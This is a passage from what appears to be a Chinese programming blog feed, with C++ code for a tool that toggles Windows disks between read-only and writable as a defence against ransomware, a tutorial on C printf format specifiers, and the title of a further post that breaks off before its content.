class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs C++"><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">VOLUME_INFO</span><br>&#123;<br>    <span class="hljs-comment">//盘符，大写，例如&#x27;C&#x27;</span><br>    <span class="hljs-type">char</span> driver;<br><br>    <span class="hljs-comment">//类型</span><br>    <span class="hljs-type">char</span> type;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">DISK_INFO</span><br>&#123;<br>    <span class="hljs-comment">//物理磁盘号</span><br>    DWORD number;<br><br>    <span class="hljs-comment">//是否只读</span><br>    <span class="hljs-type">bool</span> readOnly;<br><br>    <span class="hljs-comment">//类型，物理磁盘和分卷的类型是不一样的，详情参考相关文档</span><br>    <span class="hljs-type">char</span> type;<br><br>    <span class="hljs-comment">//卷信息</span><br>    std::vector&lt;VOLUME_INFO&gt; volumes;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">static</span> std::vector&lt;DISK_INFO&gt; <span class="hljs-title">EnumDisk</span><span class="hljs-params">()</span> </span>&#123;<br>    std::vector&lt;VOLUME_INFO&gt; volumes;<br>    std::vector&lt;DISK_INFO&gt; result;<br><br>    DWORD dwLen = <span class="hljs-built_in">GetLogicalDriveStringsA</span>(<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">char</span>* pszDriver = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[dwLen];<br>    <span class="hljs-built_in">GetLogicalDriveStringsA</span>(dwLen, pszDriver);<br><br>    <span class="hljs-keyword">for</span> (; *pszDriver != <span class="hljs-string">&#x27;\0&#x27;</span>; pszDriver += <span class="hljs-built_in">strlen</span>(pszDriver) + <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">//获取卷信息</span><br>        VOLUME_INFO vi = &#123; <span class="hljs-number">0</span> &#125;;<br>        vi.driver = pszDriver[<span class="hljs-number">0</span>];<br>        vi.type = <span class="hljs-built_in">GetDriveTypeA</span>(pszDriver);<br><br>        <span class="hljs-comment">//通过卷查找物理磁盘</span><br>        std::string buffer = <span class="hljs-string">&quot;\\\\.\\&quot;</span>;<br>        buffer += pszDriver[<span class="hljs-number">0</span>];<br>        buffer += <span class="hljs-string">&#x27;:&#x27;</span>;<br><br>        HANDLE hVol = <span class="hljs-built_in">CreateFileA</span>(buffer.<span class="hljs-built_in">c_str</span>(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-number">0</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (hVol == INVALID_HANDLE_VALUE) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无法打开卷 %s 错误码 %d\n&quot;</span>, buffer.<span class="hljs-built_in">c_str</span>(), <span class="hljs-built_in">GetLastError</span>());<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        STORAGE_DEVICE_NUMBER sdn = &#123; <span class="hljs-number">0</span> &#125;;<br>        DWORD dwBytesReturned;<br>        BOOL success = <span class="hljs-built_in">DeviceIoControl</span>(hVol, IOCTL_STORAGE_GET_DEVICE_NUMBER, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;sdn, <span class="hljs-built_in">sizeof</span>(sdn), &amp;dwBytesReturned, <span class="hljs-literal">NULL</span>);<br><br>        VOLUME_DISK_EXTENTS PVolDiskExtent = &#123; <span class="hljs-number">0</span> &#125;;<br>        DWORD cbBytes;<br>        success |= <span class="hljs-built_in">DeviceIoControl</span>(hVol, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;PVolDiskExtent, <span class="hljs-built_in">sizeof</span>(VOLUME_DISK_EXTENTS), &amp;cbBytes, <span class="hljs-literal">NULL</span>);<br>        <br>        <span class="hljs-built_in">CloseHandle</span>(hVol);<br>        <span class="hljs-keyword">if</span> (success == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无法获取卷信息 %s 错误码 %d\n&quot;</span>, buffer.<span class="hljs-built_in">c_str</span>(), <span class="hljs-built_in">GetLastError</span>());<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-type">bool</span> matched = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; disk : result) &#123;<br>            <span class="hljs-keyword">if</span> (disk.number == PVolDiskExtent.Extents[<span class="hljs-number">0</span>].DiskNumber) &#123;<br>                disk.volumes.<span class="hljs-built_in">push_back</span>(vi);<br>                matched = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!matched) &#123;<br>            DISK_INFO di = &#123; <span class="hljs-number">0</span> &#125;;<br>            di.number = PVolDiskExtent.Extents[<span class="hljs-number">0</span>].DiskNumber;<br>            di.type = sdn.DeviceType;<br>            di.volumes.<span class="hljs-built_in">push_back</span>(vi);<br>            result.<span class="hljs-built_in">push_back</span>(di);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; disk : result) &#123;<br>        HANDLE hDisk = <span class="hljs-built_in">OpenPhysicalDrive</span>(disk.number);<br>        <span class="hljs-keyword">if</span> (hDisk == INVALID_HANDLE_VALUE) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无法打开物理磁盘 %d 错误码 %d\n&quot;</span>, disk.number, <span class="hljs-built_in">GetLastError</span>());<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        disk.readOnly = <span class="hljs-built_in">IsDiskReadOnly</span>(hDisk);<br><br>        <span class="hljs-built_in">CloseHandle</span>(hDisk);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后实现一个用户接口就行了。这里我实现了一个TUI，尽可能简化操作</p><p><img src="/articles/mydiskpart/2.png"></p><p><img src="/articles/mydiskpart/1.png"></p><p><code>l</code>列出磁盘</p><p><code>r [磁盘号]</code>设置&#x2F;清除只读</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> vector&lt;string&gt; <span class="hljs-title">StringTokenizer</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; s)</span> </span>&#123;<br>    vector&lt;string&gt; tokens;<br>    string token;<br>    <span class="hljs-type">bool</span> inQuotes = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-type">char</span> c = s[i];<br><br>        <span class="hljs-comment">// Toggle inQuotes flag when encountering double quotes</span><br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&quot;&#x27;</span>) &#123;<br>            inQuotes = !inQuotes;<br>            <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// Skip the quote character itself</span><br>        &#125;<br><br>        <span class="hljs-comment">// If inside quotes, add character to current token</span><br>        <span class="hljs-keyword">if</span> (inQuotes) &#123;<br>            token += c;<br>        &#125;<br>        <span class="hljs-comment">// If not inside quotes, check for delimiters (space or tab)</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27; &#x27;</span> || c == <span class="hljs-string">&#x27;\t&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!token.<span class="hljs-built_in">empty</span>()) &#123;<br>                tokens.<span class="hljs-built_in">push_back</span>(token);<br>                token.<span class="hljs-built_in">clear</span>();<br>            &#125;<br>            <span class="hljs-comment">// Continue to skip multiple spaces/tabs</span><br>        &#125;<br>        <span class="hljs-comment">// Add character to the current token if it&#x27;s not a delimiter</span><br>        <span class="hljs-keyword">else</span> &#123;<br>            token += c;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Add the last token if any</span><br>    <span class="hljs-keyword">if</span> (!token.<span class="hljs-built_in">empty</span>()) &#123;<br>        tokens.<span class="hljs-built_in">push_back</span>(token);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> tokens;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">List</span><span class="hljs-params">(<span class="hljs-type">const</span> std::vector&lt;DISK_INFO&gt;&amp;result)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n磁盘号   只读   盘符\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; disk : result) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d        %d        &quot;</span>, disk.number, disk.readOnly);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; volume : disk.volumes) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c:\\ &quot;</span>, volume.driver);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (disk.volumes[<span class="hljs-number">0</span>].type == DRIVE_REMOVABLE) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   可移动&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(disk.volumes[<span class="hljs-number">0</span>].type == DRIVE_FIXED) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   固定&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   未知类型&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::vector&lt;DISK_INFO&gt; result = <span class="hljs-built_in">EnumDisk</span>();<br>    <span class="hljs-built_in">List</span>(result);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&gt;&quot;</span>);<br>        string input;<br>        <span class="hljs-built_in">getline</span>(cin, input);<br><br>        vector&lt;string&gt; cmd = <span class="hljs-built_in">StringTokenizer</span>(input);<br>        <span class="hljs-keyword">if</span> (cmd.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)<span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">if</span> (cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;quit&quot;</span> || cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;q&quot;</span>) &#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;l&quot;</span> || cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;ls&quot;</span> || cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;list&quot;</span>) &#123;<br>            result = <span class="hljs-built_in">EnumDisk</span>();<br>            <span class="hljs-built_in">List</span>(result);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;r&quot;</span> || cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;ro&quot;</span> || cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;readonly&quot;</span>) &#123;<br>            DWORD number;<br>            <span class="hljs-keyword">try</span> &#123;<br>                number = <span class="hljs-built_in">stoi</span>(cmd[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-built_in">catch</span> (...) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (number == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请不要把系统盘设置为只读，这只会害了你！（笑&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-type">bool</span> matched = <span class="hljs-literal">false</span>;<br>            <span class="hljs-type">char</span> type;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; disk : result) &#123;<br>                <span class="hljs-keyword">if</span> (disk.number == number) &#123;<br>                    type = disk.volumes[<span class="hljs-number">0</span>].type;<br>                    matched = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (!matched) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;错误：磁盘号未找到，请输入正确的磁盘号&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (type == DRIVE_FIXED) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;警告：不建议将固定磁盘设置为只读，这可能导致严重后果&quot;</span>);<br>                <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>            &#125;<br><br>            HANDLE hDisk = <span class="hljs-built_in">OpenPhysicalDrive</span>(number);<br>            <span class="hljs-keyword">if</span> (hDisk == INVALID_HANDLE_VALUE) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;错误：无法打开物理磁盘，错误码 %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsDiskReadOnly</span>(hDisk)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ClearDiskReadOnly</span>(hDisk)) &#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;成功清除只读&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;错误：无法清除只读，错误码 %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">SetDiskReadOnly</span>(hDisk)) &#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;成功设置只读&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;错误：无法设置只读，错误码 %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-built_in">CloseHandle</span>(hDisk);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;错误：未知指令&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>设置了只读，恶意程序也可以清除，无非就是多写点代码多写点判断的问题</p><p>不过我还没有见过可以清除只读的恶意程序（特指一些勒索软件，感染型病毒）</p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言字符串格式化详解</title>
    <link href="/articles/string_formatter/"/>
    <url>/articles/string_formatter/</url>
    
    <content type="html"><![CDATA[<p>最近在C语言课上见到了一些奇怪的printf格式化参数，正好我对这方面也不是很懂，所以就参考一些文章总结了一下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C++">%[标志][宽度][.精度][参数大小]类型<br></code></pre></td></tr></table></figure><h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><table><thead><tr><th>类型</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>c</code>(小写)</td><td>字符</td><td>与 <code>printf</code> 函数一起使用时，指定单字节字符；与 <code>wprintf</code> 函数一起使用时，指定宽字符</td></tr><tr><td><code>C</code>(大写)</td><td>字符</td><td>与 <code>printf</code> 函数一起使用时，指定宽字符；与 <code>wprintf</code> 函数一起使用时，指定单字节字符</td></tr><tr><td><code>d</code></td><td>整数</td><td>带符号十进制整数（d和i主要区别在scanf中，d明确表示十进制整数，比如输入0x1A将被解析为0。而i更灵活，可以自动识别不同的基数，比如输入0x1A将被解析为26）</td></tr><tr><td><code>i</code></td><td>整数</td><td>同上</td></tr><tr><td><code>u</code></td><td>整数</td><td>无符号十进制整数</td></tr><tr><td><code>o</code></td><td>整数</td><td>无符号八进制整数</td></tr><tr><td><code>x</code>(小写)</td><td>整数</td><td>无符号十六进制整数，小写x输出小写字母，例如aabb。大写X输出大写字母，例如AABB</td></tr><tr><td><code>X</code>(大写)</td><td>整数</td><td>同上</td></tr><tr><td><code>e</code></td><td>浮点</td><td>有符号浮点(科学计数法表示)。e使用小写e来表示指数，例如1.234568e+05。E使用大写E来表示指数，例如1.234568E+05</td></tr><tr><td><code>E</code></td><td>浮点</td><td>同上</td></tr><tr><td><code>f</code></td><td>浮点</td><td>有符号十进制浮点(固定小数点表示)，小写f的<code>infinity</code> 和 <code>nan</code> 为小写，大写F为大写</td></tr><tr><td><code>F</code></td><td>浮点</td><td>同上</td></tr><tr><td><code>g</code></td><td>浮点</td><td>以最紧凑的形式输出浮点数，自动选择是固定小数点表示法还是科学计数法。g和G的区别也在大小写上</td></tr><tr><td><code>G</code></td><td>浮点</td><td>同上</td></tr><tr><td><code>a</code></td><td>浮点</td><td>有符号十六进制浮点(类科学计数法表示)，例如双精度3.14159输出0x1.921f9f01b866ep+1。a和A的区别也在大小写上</td></tr><tr><td><code>A</code></td><td>浮点</td><td>同上</td></tr><tr><td><code>n</code></td><td>指向整数的指针</td><td>一个特殊的类型，不用来格式化数据，而是记录到目前为止已成功输出(或输入)的字符数量。例如语句<code>printf(&quot;Hello World%n&quot;, &amp;a);</code>执行完后变量a的值为11。由于安全原因，msvc已禁用此类型</td></tr><tr><td><code>p</code></td><td>指针</td><td>以十六进制形式输出变量地址</td></tr><tr><td><code>s</code>(小写)</td><td>字符串</td><td>与 <code>printf</code> 函数一起使用时，指定单字节或多字节字符串；与 <code>wprintf</code> 函数一起使用时，指定宽字符字符串。 将于第一个空字符之前或达到精度值时显示字符。</td></tr><tr><td><code>S</code>(大写)</td><td>字符串</td><td>与 <code>printf</code> 函数一起使用时，指定宽字符字符串；与 <code>wprintf</code> 函数一起使用时，指定单字节或多字节字符串。 将于第一个空字符之前或达到精度值时显示字符。</td></tr></tbody></table><h1 id="标志"><a href="#标志" class="headerlink" title="标志"></a>标志</h1><table><thead><tr><th>标志</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td><code>-</code></td><td>左对齐</td><td>右对齐</td></tr><tr><td><code>+</code></td><td>不论正数还是负数，都添加符号前缀（+或 -）</td><td>只对负数添加符号前缀（-）</td></tr><tr><td><code>#</code></td><td>输出非十进制数时自动添加前缀（0 0x 0X）</td><td>不添加前缀</td></tr><tr><td></td><td>输出固定小数点表示的浮点数时确保小数点总是存在（即使小数部分没有数字）</td><td>小数部分无数字将被忽略</td></tr><tr><td><code>0</code></td><td>当与宽度一起使用时，用零填充空白区域</td><td>用空格填充空白区域</td></tr></tbody></table><h1 id="宽度"><a href="#宽度" class="headerlink" title="宽度"></a>宽度</h1><p>定义了最小的字段宽度，不足宽度的将被自动填充</p><p>如果宽度填入星号 (<code>*</code>)，则从参数列表中获取宽度</p><p>示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%6d\n&quot;</span>, <span class="hljs-number">123</span>);<span class="hljs-comment">//输出   123（前面三个空格）</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%06d\n&quot;</span>, <span class="hljs-number">123</span>);<span class="hljs-comment">//输出000123</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%0*d\n&quot;</span>, <span class="hljs-number">6</span>, <span class="hljs-number">123</span>);<span class="hljs-comment">//输出000123，与上面的语句等价</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%06d\n&quot;</span>, <span class="hljs-number">123456789</span>);<span class="hljs-comment">//输出123456789</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%06s\n&quot;</span>, <span class="hljs-string">&quot;123456789&quot;</span>);<span class="hljs-comment">//输出123456789（不会截断，区别于精度！）</span><br></code></pre></td></tr></table></figure><h1 id="精度"><a href="#精度" class="headerlink" title="精度"></a>精度</h1><ul><li>对于浮点数，它定义了小数点后的位数。</li><li>对于字符串，它限制了最大字符数。</li><li>对于整数类型，它指定了最少的数字位数，不足的部分以<code>0</code>填充。（区别于宽度，宽度默认以空格填充）</li><li>如果省略，对于某些类型（如<code>%g</code>和<code>%G</code>），则意味着“尽可能高的精度”。</li></ul><p>如果精度填入星号 (<code>*</code>)，则从参数列表中获取精度（类似上面的宽度）</p><p>与宽度不同的是，精度规范可能导致输出值截断或浮点值舍入</p><p>如果精度为 0 且要转换的值为 0，则无字符输出</p><p>示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.0d\n&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//不会输出任何内容</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.6d\n&quot;</span>, <span class="hljs-number">123</span>);<span class="hljs-comment">//输出000123</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.3f\n&quot;</span>, <span class="hljs-number">3.14159265</span>);<span class="hljs-comment">//四舍五入保留三位小数，输出3.142</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.*f\n&quot;</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3.14159265</span>); <span class="hljs-comment">//输出3.142，与上面的语句等价</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.6s\n&quot;</span>, <span class="hljs-string">&quot;123456789&quot;</span>);<span class="hljs-comment">//对字符串截断到6位，仅输出123456（会截断，区别于宽度！）</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.6d\n&quot;</span>, <span class="hljs-number">123456789</span>);<span class="hljs-comment">//对整数不会进行截断，输出123456789</span><br></code></pre></td></tr></table></figure><h1 id="参数大小"><a href="#参数大小" class="headerlink" title="参数大小"></a>参数大小</h1><table><thead><tr><th>参数类型</th><th>前缀</th></tr></thead><tbody><tr><td><code>int8</code></td><td><code>hh</code></td></tr><tr><td><code>int16</code></td><td><code>h</code></td></tr><tr><td><code>int32</code></td><td><code>I32</code>或<code>l</code>(小写L)</td></tr><tr><td><code>int64</code></td><td><code>j</code>或<code>I64</code>或<code>ll</code>(小写L)</td></tr><tr><td><code>double</code></td><td><code>l</code>(大小写L均可)</td></tr></tbody></table><p>示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//输出1099511627775</span><br><span class="hljs-type">int64_t</span> a = <span class="hljs-number">0xffffffffff</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld\n&quot;</span>, a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%I64d\n&quot;</span>, a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%jd\n&quot;</span>, a);<br><br><span class="hljs-comment">//输出3.14159265358979</span><br><span class="hljs-type">double</span> b = <span class="hljs-number">3.14159265358979</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.14lf\n&quot;</span>, b);<br></code></pre></td></tr></table></figure><h1 id="一些特殊修饰符"><a href="#一些特殊修饰符" class="headerlink" title="一些特殊修饰符"></a>一些特殊修饰符</h1><p><code>%n$</code> 位置参数，用于指定参数位置（gcc非标拓展，msvc不支持）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2$d %1$d&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">20</span> ); <span class="hljs-comment">//输出20 10</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写一个流量消耗器</title>
    <link href="/articles/fuck_isp/"/>
    <url>/articles/fuck_isp/</url>
    
